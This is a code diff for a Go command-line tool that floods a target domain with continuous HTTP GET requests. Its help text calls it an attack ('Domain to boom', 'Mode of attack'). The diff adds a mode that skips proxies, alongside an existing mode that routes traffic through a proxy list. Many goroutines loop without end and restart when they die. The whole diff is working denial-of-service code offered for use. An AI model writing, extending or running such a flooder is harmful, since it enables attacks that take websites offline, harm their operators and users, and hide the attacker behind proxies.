@@ -185,6 +185,32 @@ func handlerProxy(domain, proxy string) string {
 	}
 }
 
+func handler(domain string) string {
+	//just connect to the website and check the status code
+	//format of domain is domain.com
+	//create a new http client
+	client := &http.Client{}
+	//set http client like a mozilla browser
+	client.Timeout = time.Second * 5
+	//connect to the website
+	resp, err := client.Get("http://" + domain)
+	if err != nil {
+		return "error"
+	}
+	defer resp.Body.Close()
+	//if resp is 503 too many connection
+	// make [][]string statusCodeToEscape
+	if stringInSlice(resp.Status, statusCodeToEscape) {
+		return "error"
+	}
+	if resp.StatusCode != 0 {
+		//fmt.Println(resp.Status)
+		return resp.Status
+	} else {
+		return "error"
+	}
+}
+
 func removeDuplicates(elements []string) []string {
 	// Use map to record duplicates as we find them.
 	encountered := map[string]bool{}
@@ -268,6 +294,7 @@ func main() {
 	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
 	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of threads", Default: "max"})
 	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
+	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
 	err := parser.Parse(os.Args)
 	if err != nil {
 		fmt.Print(parser.Usage(err))
@@ -277,61 +304,92 @@ func main() {
 		fmt.Println("The domain or ip is not up")
 		os.Exit(1)
 	}
-	for _, p := range *proxy_file {
-		//split all the files by comma
-		if strings.Contains(p, ",") {
-			*proxy_file = strings.Split(p, ",")
-		} else {
-			*proxy_file = append(*proxy_file, p)
+	//select mode 1 or 2
+	if *mode == 1 {
+		for _, p := range *proxy_file {
+			//split all the files by comma
+			if strings.Contains(p, ",") {
+				*proxy_file = strings.Split(p, ",")
+			} else {
+				*proxy_file = append(*proxy_file, p)
+			}
 		}
-	}
-	proxy_list := test_proxy(*proxy_file)
+		proxy_list := test_proxy(*proxy_file)
 
-	//get the list of proxy
-	fmt.Println("Total proxy :", len(proxy_list))
-	threads_int := 10
+		//get the list of proxy
+		fmt.Println("Total proxy :", len(proxy_list))
+		threads_int := 10
 
-	if *threads != "max" {
-		threads_int, err = strconv.Atoi(*threads)
+		if *threads != "max" {
+			threads_int, err = strconv.Atoi(*threads)
+			if err != nil {
+				fmt.Println("Error : threads must be a number")
+				os.Exit(1)
+			}
+		} else {
+			threads_int = len(proxy_list)
+		}
+		if threads_int > len(proxy_list) {
+			threads_int = len(proxy_list)
+			fmt.Println("Apply max threads")
+		}
+		//chunk the proxy list
+		chunked_proxy_list := chunkSlice(proxy_list, threads_int)
+		//start the threads
+		//create a channel list of good proxy
+		for {
+			var wg sync.WaitGroup
+			for _, chunk := range chunked_proxy_list {
+				wg.Add(1)
+				go func(chunk []string) {
+					defer wg.Done()
+					for _, proxy := range chunk {
+						for {
+							//time.Sleep(time.Millisecond * 100)
+							status := handlerProxy(*domain, proxy)
+							if status != "error" {
+								fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
+								continue
+							} else {
+								break
+							}
+
+						}
+						fmt.Println("Thread died")
+						return
+					}
+				}(chunk)
+			}
+			wg.Wait()
+			fmt.Println("All threads are dead, restarting")
+		}
+	} else if *mode == 2 {
+		threads_int, err := strconv.Atoi(*threads)
 		if err != nil {
 			fmt.Println("Error : threads must be a number")
 			os.Exit(1)
 		}
-	} else {
-		threads_int = len(proxy_list)
-	}
-	if threads_int > len(proxy_list) {
-		threads_int = len(proxy_list)
-		fmt.Println("Apply max threads")
-	}
-	//chunk the proxy list
-	chunked_proxy_list := chunkSlice(proxy_list, threads_int)
-	//start the threads
-	//create a channel list of good proxy
-	for {
-		var wg sync.WaitGroup
-		for _, chunk := range chunked_proxy_list {
-			wg.Add(1)
-			go func(chunk []string) {
-				defer wg.Done()
-				for _, proxy := range chunk {
+		for {
+			var wg sync.WaitGroup
+			for i := 0; i < threads_int; i++ {
+				wg.Add(1)
+				go func() {
+					//use func handler
+					defer wg.Done()
 					for {
-						//time.Sleep(time.Millisecond * 100)
-						status := handlerProxy(*domain, proxy)
+						status := handler(*domain)
 						if status != "error" {
 							fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
 							continue
 						} else {
 							break
 						}
-
 					}
-					fmt.Println("Thread died")
-					return
-				}
-			}(chunk)
+				}()
+			}
+			wg.Wait()
+			fmt.Println("All threads are dead, restarting")
 		}
-		wg.Wait()
-		fmt.Println("All threads are dead, restarting")
 	}
+
 }
